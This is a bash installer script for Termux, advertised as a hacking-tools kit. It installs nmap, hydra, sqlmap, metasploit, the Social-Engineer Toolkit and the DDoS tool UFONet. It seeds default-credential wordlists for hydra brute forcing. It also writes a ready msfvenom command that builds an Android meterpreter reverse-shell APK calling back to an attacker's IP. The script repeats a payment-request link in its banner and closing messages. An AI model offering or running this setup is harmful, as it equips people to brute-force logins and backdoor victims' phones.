#!/bin/bash

# Custom Text Banner
echo -e "\e[1;32m"
echo "  __  __   _   _   _____   _   _   _____   _   _   _____  "
echo " |  \/  | | | | | |  __ \ | \ | | |_   _| | \ | | / ____| "
echo " | \  / | | | | | | |__) ||  \| |   | |   |  \| || |  __  "
echo " | |\/| | | | | | |  ___/ | . \` |   | |   | . \` || | |_ | "
echo " | |  | | | |_| | | |     | |\  |  _| |_  | |\  || |__| | "
echo " |_|  |_|  \___/  |_|     |_| \_| |_____| |_| \_| \_____| "
echo -e "\e[0m"
echo "Termux Hacking Tools Installer"
echo "Created by MGLINK"
echo "----------------------------------------"
echo "Payment Request: Shafiulucky has requested 5 USDC payment."
echo "Tap this link to pay: https://s.binance.com/B6xaFgcb"
echo "GitHub Repository: https://github.com/Maidawailtd/termux-tools"
echo "----------------------------------------"

# Update and upgrade packages
echo -e "\e[1;34m[*] Updating and upgrading packages...\e[0m"
pkg update -y && pkg upgrade -y

# Install essential packages
echo -e "\e[1;34m[*] Installing essential packages...\e[0m"
pkg install -y git python python2 php curl wget nano vim

# Install popular hacking tools
echo -e "\e[1;34m[*] Installing hacking tools...\e[0m"
pkg install -y nmap hydra sqlmap metasploit

# Install additional tools
echo -e "\e[1;34m[*] Cloning repositories...\e[0m"
git clone https://github.com/rapid7/metasploit-framework.git
git clone https://github.com/vanhauser-thc/thc-hydra.git
git clone https://github.com/sqlmapproject/sqlmap.git

# Install Python-based tools
echo -e "\e[1;34m[*] Installing Python tools...\e[0m"
pip install requests bs4

# Install tools from GitHub
echo -e "\e[1;34m[*] Cloning additional tools...\e[0m"
git clone https://github.com/trustedsec/social-engineer-toolkit.git
git clone https://github.com/epsylon/ufonet.git

# Set up hydra wordlists
echo -e "\e[1;34m[*] Setting up hydra wordlists...\e[0m"
echo "admin" > passwd.txt
echo "root" >> passwd.txt
echo "user" >> passwd.txt
echo "admin" > userslist.txt
echo "root" >> userslist.txt
echo "user" >> userslist.txt

# Set up Metasploit payloads
echo -e "\e[1;34m[*] Setting up Metasploit payloads...\e[0m"
mkdir -p ~/metasploit-payloads
echo "msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 R > ~/metasploit-payloads/android_payload.apk" > ~/metasploit-payloads/generate_payload.sh
chmod +x ~/metasploit-payloads/generate_payload.sh

# Set up environment
echo -e "\e[1;34m[*] Setting up environment...\e[0m"
echo "export PATH=\$PATH:~/social-engineer-toolkit:~/ufonet" >> ~/.bashrc
source ~/.bashrc

# Completion message
echo -e "\e[1;32m[+] Installation complete! Restart Termux to apply changes.\e[0m"
echo -e "\e[1;32m[+] Hydra wordlists: passwd.txt and userslist.txt are ready.\e[0m"
echo -e "\e[1;32m[+] Metasploit payloads can be generated in ~/metasploit-payloads.\e[0m"
echo -e "\e[1;32m[+] Created by MGLINK. Follow for more tools and tutorials!\e[0m"
echo -e "\e[1;32m[+] Payment Request: Shafiulucky has requested 5 USDC payment.\e[0m"
echo -e "\e[1;32m[+] Tap this link to pay: https://s.binance.com/B6xaFgcb\e[0m"
echo -e "\e[1;32m[+] GitHub Repository: https://github.com/Maidawailtd/termux-tools\e[0m"
